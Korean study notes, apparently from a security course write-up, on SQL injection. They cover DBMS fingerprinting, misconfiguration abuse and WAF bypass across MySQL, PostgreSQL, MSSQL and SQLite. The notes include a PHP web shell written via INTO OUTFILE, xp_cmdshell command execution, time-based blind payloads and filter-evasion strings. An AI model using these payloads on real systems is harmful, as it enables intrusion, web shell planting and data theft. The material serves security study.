```markdown
---
layout: post
title: "SQL injection 2"
categories: [SWING, Writeup, Self-study]
tags: [SQL Injection, DBMS, Fingerprinting, WAF Bypass]
last_modified_at: 2024-01-11
---

### [WHA-S] ExploitTech: DBMS Fingerprinting
sql injection 취약점 발견  
가장 먼저 DBMS의 종류와 버전  

#### DBMS 정보를 수집하는 방법
1. 쿼리 실행 결과 출력되는 경우 -> DBMS에서 지원하는 환경 변수값으로 알아내기  
   ```sql
   SELECT @version
   SELECT version()
   ```
2. 에러 메시지 출력하는 경우 -> 에러메시지 안 DBMS 정보 노출  
   ```sql
   SELECT 1 union SELECT 1,2;
   # MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
   (# select * from not_exists_table)
   # SQLite => Error: no such table: not_exists_table
   ```
3. 참 거짓 출력 -> blind SQL injection 사용  
   ```sql
   mid(@version, 1, 1)='5';
   substr(version(),1,1)='P';
   ```
4. 예외, 아무것도 출력하지 않을 경우 -> 시간 지연 함수 사용  
   ```sql
   sleep(10)
   pg_sleep(10)
   ```

#### DBMS별 fingerprinting
1. MySQL  
   ```sql
   # 쿼리 실행 결과 출력 시
   mysql> select @version; # 또는 select version();
   ```
   ```sql
   # 에러 메시지 출력 시
   mysql> select 1 union select 1,2;
   ERROR 1222 (21000): The used SELECT statements have a different number of columns
   ```
   ```sql
   # 참 또는 거짓 출력 시 
   mysql> select mid(@version,1,1)='5';
   mysql> select mid(@version,1,1)='6';
   ```
   ```sql
   # 아무것도 출력되지 않을 시
   mysql> select mid(@version,1,1)='6' and sleep(2); #맞다면 2초 sleep 
   mysql> select mid(@version,1,1)='5' and sleep(2);
   ```

2. PostgreSQL  
   ```sql
   # 쿼리 실행 결과 출력 시
   postgres$ select version();
   ```
   ```sql
   # 에러 메시지 출력 시
   postgres$ select 1 union select 1,2;
   ERROR: each UNION query must have the same number of columns
   LINE 1: select 1 union select 1,2;
   ```
   ```sql
   # 참 거짓 출력 시
   postgres$ select substr(version(),1,1)='P'; #참이면 t 반환
   ```

3. MSSQL  
   ```sql
   # 쿼리 실행 결과 출력 
   > select @version;
   ```
   ```sql
   # 에러 메시지 출력 시
   > select 1 union select 1,2;
   Msg 205, Level 16, State 1, Server e2cb36ec2593, Line 1
   All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
   ```
   ```sql
   # 참 거짓 출력 시 
   > select 1 from test where substring(@version,1,1)='M'; #참이면 1
   ```
   ```sql
   # 아무것도 출력하지 않을 시
   select '' if(substring(@version,1,1)='M') waitfor delay '0:0:5';
   ```

4. SQLite  
   ```sql
   # 쿼리 실행 결과 출력 시
   sqlite> select sqlite_version();
   ```
   ```sql
   # 에러 메시지 출력 시
   sqlite> select 1 union select 1,2;
   Error: SELECTs to the left and right of UNION do not have the same number of result columns
   ```
   ```sql
   # 참 거짓 출력 시
   sqlite> select substr(sqlite_version(),1,1)='3'; #참이면 1 반환
   ```
   ```sql
   # 아무것도 출력하지 않을 시
   select case when substr(sqlite_version(),1,1)='3' then LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))) else 1=1 end;
   #참이면 시간 지연 발생, 거짓이면 1=1 식 실행
   ```

### [WHA-S] ExploitTech: DBMS misconfiguration
계정 및 권한이 적절하게 분리 X, 불필요한 기능 활성화, DB 보안 미흡  

#### out of DBMS
함수나 기능으로 파일 시스템, 네트워크, OS 명령어 접근 가능해짐  
**1. MySQL**  
MySQL 파일 관련 작업 -> mysql 권한으로 수행  
"my.cnf" 설정 파일의 secure_file_priv값에 영향을 받음  
secure_file_priv는 mysql 쿼리 내에서 load_file, outfile로 파일 접근할 때 쓰는 파일 경로 정보 포함함  
```sql
# my.cnf
[mysqld]
# secure_file_priv = "" # 미설정. 기본 설정 값으로 설정 
secure_file_priv = "/tmp" # 해당 디렉터리 하위 경로로만 접근 가능 
secure_file_priv = "" # mysql 모든 경로에 접근 가능 
secure_file_priv = NULL # 기능 비활성화
```
기본적으로는 secure_file_priv 값이 /var/lib/mysql-files/로 세팅되어 있음  
```sql
# 권한 세팅 확인
mysql> select @secure_file_priv;
```
load_file: 전달된 파일 읽고, 출력  
- secure_file_priv 시스템 변수 설정되어야 함  
- 파일의 전체 경로 입력  
- 해당 파일 접근 권한 소유해야 함  
```sql
# echo test1234 > /var/lib/mysql-files/test
mysql> select load_file('/var/lib/mysql-files/test');
```
into outfile: SELECT ... INTO 꼴은 결과를 변수나 파일에 작성 가능  
if secure_file_priv 값이 부적절하여 임의 경로에서 파일 작업 가능, 웹쉘 업로드 가능  
```sql
SELECT ... INTO var_list # columns 값을 변수에 저장 
SELECT ... INTO OUTFILE 'filename' # 쿼리 결과의 rows 값을 파일에 저장 
SELECT ... INTO DUMPFILE 'filename' # 쿼리 결과(single row)를 파일에 저장
```
```sql
mysql> select '<?='$_GET[0]?>' into outfile '/tmp/a.php';
```

**2. MSSQL**  
xp_cmdshell 기능으로 OS 명령어 실행 가능  
단, 이 기능은 기본값이 비활성화이므로 임의로 활성화 해둔 경우에만 공격 가능  
```sql
# 활성화 여부 확인
SELECT name, value, description FROM sys.configurations WHERE name = 'xp_cmdshell';
```
```sql
# xp_cmdshell 활성화된 경우
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

#### DBMS 권한 문제 주의 사항
**- DBMS 애플리케이션 작동 권한**  
리눅스 서버에서는 이용자 별로 권한 분리  
서버에서 DBMS 작동 -> DBMS 전용 계정 사용하기  
계정을 분리하지 않으면 루트 계정이나 다른 애플리케이션 권한이 탈취될 수 있음 -> out of DBMS  

**- DBMS 계정 권한**  
루트 계정 사용 지양, 서비스 및 기능 별로 계정 분리  
그렇지 않으면 한 서비스에서 SQL injection-> 다른 DB 침범 가능  

#### DBMS 문자열 비교 주의 사항
DBMS마다 문자열 비교 방법 다름  
- 대소문자 구분  
mysql, mssql 에서는 대소문자를 구별하지 않음(같은 문자로 인식)  

- 공백 문자로 끝나는 문자열 비교  
일부 DBMS에서는 비교 연산 시 컬럼 크기에 맞게 공백 문자 채움  
char(5) 컬럼에 ab가 들어가면 공백 3  

#### DBMS 다중 쿼리 주의 사항
다중 쿼리: 하나의 요청, 다수의 쿼리 구문  
```sql
# 다중 쿼리 예시
SELECT * from users where uid=''; INSERT users values (...);
```
PDO를 사용하여 다중 쿼리 실행 -> exec 함수가 다중 쿼리 실행 (query 함수는 지원 X)  
```php
<?
	$db1 = new PDO('sqlite:test1.db');
    $db2 = new PDO('sqlite:test2.db');
    $query = 'select 1234; create table test(test int);';
    $db1->query($query);
    $db2->exec($query);
?>
# 실행 결과, 두 파일의 크기 비교로 알 수 있음
```

### [WHA-S] ExploitTech: Bypass WAF
Web Application Firewall(WAF): 웹 애플리케이션 방화벽  
악성 트래픽 유발 디도스, DB 관련 SQLi, log4j 등의 공격 탐지 및 차단  

#### 미흡한 방화벽 검사
**1. 대소문자 검사 미흡**  
SQL은 대소문자를 구별하지 않음  
방화벽에서 UNION 검열 -> union 대체  
대소문자 모두 검열 -> UniOn 등 대체  

**2. 탐지 과정 미흡**  
ex) union 키워드를 공백으로 치환할 경우  
UNunionION 등으로 대체  

**3. 문자열 검사 미흡**  
reverse와 concat 함수를 이용하거나 16진수를 이용  
```sql
mysql> SELECT reverse('nimda'), concat('adm','in'), x'61646d696e', 0x61646d696e;
```

**4. 연산자 검사 미흡**  
and, or 필터링 -> &&, || 등 연산자로 대체  
^,=,!=,%,/,*,&,&&,|,||,<,>,XOR,DIV,LIKE,RLIKE,REGEXP,IS,IN,NOT,MATCH,AND,OR,BETWEEN,ISNULL  

**5. 공백 탐지**  
/**/를 삽입하여 공백 우회, 백틱 문자로 공백 대체  
*맥에서 백틱 쓰기: 원화 누르기  

#### MySQL 우회 기법
1. 문자열 검사 우회  
```sql
# 진법 이용
mysql> select 0x6162, 0b110000101100010; # ab
```
```sql
# 함수 이용 
mysql> select char(0x61,0x62);
mysql> select concat(char(0x61), char(0x62));
```
```sql
# 가젯 이용 
mysql> select mid(@version,12, 1);
```

2. 공백 검사 우회  
```sql
# 개행 이용 
mysql> select 
	-> 1;
```
```sql
# 주석 이용 
mysql> select 1/**/;
```

3. 주석 구문 실행  
```sql
mysql> select 1 <span class="hljs-comment">/*!union*/</span> select 2;
```
`/*! ... */`는 주석 처리 아님  

#### PostgreSQL 우회 기법
1. 문자열 검사 우회  
```sql
# 함수 이용
postgres=> select chr(65);
```
```sql
# 함수 이용 2
postgres=> select concat(chr(65),chr(66));
```
```sql
# 가젯 이용 
postgres=> select substring(version(),23,1);
```

2. 공백 검사 우회  
```sql
# 개행 이용
postgres-> select
1;
```
```sql
# 주석 이용
postgres=> select 1/**/;
```

#### MSSQL 우회 기법
1. 문자열 검사 우회  
```sql
# 함수 이용 
> select char(0x61);
```
```sql
# 함수 이용 2
> select concat(char(0x61),char(0x62));
```
```sql
# 가젯 이용 
> select substring(@version,134,1);
```

2. 공백 검사 우회  
```sql
# 개행 이용 
> select
1;
```
```sql
# 주석 이용 
> select 1/**/;
```

#### SQLite 우회 기법 
1. 문자열 검사 우회  
```sql
# 함수 이용
sqlite> select char(0x61);
```
```sql
# 함수 이용 2
sqlite> select char(0x61)||char(0x62);
```

2. 공백 검사 우회  
```sql
# 개행 이용 
sqlite> select 
	...> 1;
```
```sql
# 주석 이용 
sqlite> select 1/**/;
```

3. 구문 검사 우회  
select 구문을 사용 못할 때 union values(num)로 원하는 값 반환  
```sql
sqlite> select 1 union values(2);
```
```